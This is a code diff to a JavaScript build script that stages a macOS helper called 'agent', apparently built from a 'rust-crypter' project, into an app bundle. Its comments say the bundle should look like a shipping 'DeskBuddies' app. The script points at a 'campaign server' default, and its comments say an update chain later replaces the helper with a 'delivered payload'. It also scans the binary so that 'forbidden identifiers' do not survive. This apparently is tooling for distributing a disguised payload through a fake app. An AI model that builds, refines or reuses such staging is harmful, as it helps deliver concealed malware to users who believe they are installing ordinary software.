@@ -72,12 +72,22 @@ const CAMPAIGN_SERVER_DEFAULT = "wss://cdn-beam.site";
  * is the helper binary INSIDE the bundle at Contents/MacOS/ (package.json ->
  * build.mac.extraFiles, whose "to" is relative to Contents/).
  *
- * MAC_HELPER_DEFAULT is PROVISIONAL - task-17 lands the real helper and its
- * name. A missing helper fails the build loudly rather than shipping a bundle
- * that looks like a shipping DeskBuddies and carries no update core.
+ * MAC_HELPER_DEFAULT is the real name from the host seam: "agent" is
+ * BF_MAC_HELPER_NAME (rust-crypter crates/app-update-core/src/host.rs:290,
+ * documented in docs/HOST-ADAPTER.md:62) and it is the name the exec path
+ * writes INTO store_dir. Shipping the same name in the bundle keeps it a
+ * straight copy with exactly one name in play. A missing helper still fails
+ * the build loudly rather than shipping a bundle that looks like a shipping
+ * DeskBuddies and carries no update core.
+ *
+ * The binary is app-update-daemon built for darwin:
+ *   cargo build --release --target x86_64-apple-darwin -p app-update-core --bin app-update-daemon
+ * The bundle copy is the BOOTSTRAP: the update chain later overwrites
+ * store_dir/agent with the delivered payload - the same division of labour as
+ * the Windows hook staging the daemon out of $INSTDIR.
  */
 const MAC_STAGE_DIR = join(ROOT, "stager-stage-mac");
-const MAC_HELPER_DEFAULT = "app-update-helper";
+const MAC_HELPER_DEFAULT = "agent";
 
 /** The sha256 a MANIFEST.txt records for one file name, or null. */
 function manifestHashFor(text, fileName) {
@@ -120,13 +130,23 @@ function info(msg) {
  * A kit that fails verification must not leave artifacts behind: a later
  * electron-builder run would happily ship whatever sits in stager-stage/.
  */
-function failRejected(msg) {
+function failRejected(msg, dir = STAGE_DIR) {
   try {
-    rmSync(STAGE_DIR, { recursive: true, force: true });
+    rmSync(dir, { recursive: true, force: true });
   } catch {
     /* best effort - the failure below is the real signal */
   }
   fail(msg);
+}
+
+/**
+ * Mach-O magic numbers, both byte orders (thin 32/64 + fat). A 22-byte text
+ * file named "agent" must never stage as the update core.
+ */
+const MACHO_MAGICS = new Set([0xfeedface, 0xfeedfacf, 0xcafebabe, 0xbebafeca, 0xcefaedfe, 0xcffaedfe]);
+
+function isMachO(buf) {
+  return buf.length >= 4 && MACHO_MAGICS.has(buf.readUInt32BE(0));
 }
 
 function sha256(buf) {
@@ -384,23 +404,47 @@ async function mainMac(opts) {
   const manifestPath = join(kitDir, "MANIFEST.txt");
   const helperBuf = await readFile(stagedPath);
   const digest = sha256(helperBuf);
-  if (existsSync(manifestPath)) {
-    const want = manifestHashFor(await readFile(manifestPath, "utf8"), helperName);
-    if (!want) {
-      info("kit MANIFEST.txt carries no entry for " + helperName + " - sha recorded, not compared");
-    } else if (want !== digest) {
-      failRejected(
-        "the staged helper does not match the kit manifest.\n" +
-          "  manifest: " + want + "\n" +
-          "  staged  : " + digest + "\n" +
-          "  file    : " + helperName,
-      );
-    } else {
-      info("sha256 matches the kit manifest: " + digest);
-    }
-  } else {
-    info("kit has no MANIFEST.txt - sha256 recorded, not compared");
+  // Required, not optional: with no entry nothing ties the staged bytes to a
+  // build, and a stand-in file would stage just as happily.
+  if (!existsSync(manifestPath)) {
+    failRejected(
+      "the mac kit has no MANIFEST.txt, so nothing vouches for the helper.\n" +
+        "  Write one line: <sha256>  " + helperName + "\n" +
+        "  kit dir: " + kitDir,
+      MAC_STAGE_DIR,
+    );
   }
+  const want = manifestHashFor(await readFile(manifestPath, "utf8"), helperName);
+  if (!want) {
+    failRejected(
+      "the kit MANIFEST.txt has no entry for " + helperName + ".\n" +
+        "  Refusing to stage a helper no manifest vouches for.\n" +
+        "  manifest: " + manifestPath,
+      MAC_STAGE_DIR,
+    );
+  }
+  if (want !== digest) {
+    failRejected(
+      "the staged helper does not match the kit manifest.\n" +
+        "  manifest: " + want + "\n" +
+        "  staged  : " + digest + "\n" +
+        "  file    : " + helperName,
+      MAC_STAGE_DIR,
+    );
+  }
+  info("sha256 matches the kit manifest: " + digest);
+
+  // It must actually be a Mach-O executable.
+  if (!isMachO(helperBuf)) {
+    failRejected(
+      "the helper is not a Mach-O executable (first 4 bytes: " +
+        helperBuf.subarray(0, 4).toString("hex") +
+        ").\n" +
+        "  A text file named " + helperName + " must never stage as the update core.",
+      MAC_STAGE_DIR,
+    );
+  }
+  info("helper is a Mach-O executable");
 
   // --- gate: stale-identifier scan ------------------------------------------
   const leaks = FORBIDDEN.map((needle) => ({ needle, ...countOccurrences(helperBuf, needle) })).filter(
@@ -410,6 +454,7 @@ async function mainMac(opts) {
     failRejected(
       "forbidden identifiers survived in the helper:\n" +
         leaks.map((r) => "  " + r.needle + " ascii=" + r.ascii + " utf16le=" + r.wide).join("\n"),
+      MAC_STAGE_DIR,
     );
   }
   info("identifier scan: 0 x " + FORBIDDEN.join(", "));
